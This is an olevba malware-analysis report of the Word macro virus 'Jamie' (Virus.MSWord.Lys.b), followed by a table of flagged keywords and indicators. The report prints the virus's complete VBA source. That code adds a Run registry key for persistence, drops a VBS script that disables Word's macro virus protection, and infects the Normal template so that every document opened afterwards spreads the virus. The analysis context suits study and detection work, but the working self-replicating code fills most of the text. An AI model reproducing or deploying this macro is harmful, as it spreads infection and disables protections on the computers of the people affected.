olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Lys.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Lys.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Jamie") = "C:\WINDOWS\SYSTEM\Jamie.vbs"
ActiveDocument.VBProject.VBComponents.Item(1).Export ("C:\WINDOWS\SYSTEM\Jamie.dll")
Open "C:\WINDOWS\SYSTEM\Jamie.vbs" For Output As #1
Print #1, "Set Jamie = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "Jamie.Options.VirusProtection = False"
Print #1, "Jamie.Options.SaveNormalPrompt = False"
Print #1, "Jamie.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\SYSTEM\Jamie.sys" & Chr(34) & ")"
Print #1, "Jamie.Application.Quit"
Close #1
Open "C:\WINDOWS\SYSTEM\Jamie.sys" For Output As #1
Print #1, "Private Sub Document_Open()"
Print #1, "ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\SYSTEM\Jamie.dll" & Chr(34) & ")"
Print #1, "With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule"
Print #1, "For x = x To 3"
Print #1, ".DeleteLines 1"
Print #1, "Next"
Print #1, "End With"
Print #1, "End Sub"
Close #1
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
',.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,
' Jamie(Type B - Strand B) By Lys KovicK
' Released: Friday, May 21, 1999, 16:10
'';';';';';';';';';';';';';';';';';';';';'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Jamie.vbs           |Executable file name                         |
|IOC       |Jamie.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

